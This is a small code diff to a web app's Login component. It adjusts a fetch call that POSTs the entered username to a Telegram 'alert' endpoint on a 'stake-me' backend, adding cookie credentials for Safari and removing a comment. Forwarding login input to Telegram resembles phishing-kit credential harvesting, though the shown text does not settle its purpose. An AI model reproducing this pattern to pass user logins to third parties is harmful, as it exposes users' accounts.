@@ -59,9 +59,10 @@ export default function Login() {
     try {
       await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
+        credentials: 'include',  // ✅ إضافة هذا السطر لدعم Safari
         headers: {
           'Content-Type': 'application/json',
-          'Origin': 'https://stake-me.com',  // ✅ إضافة هذا السطر
+          'Origin': 'https://stake-me.com',
         },
         body: JSON.stringify({
           username: username,
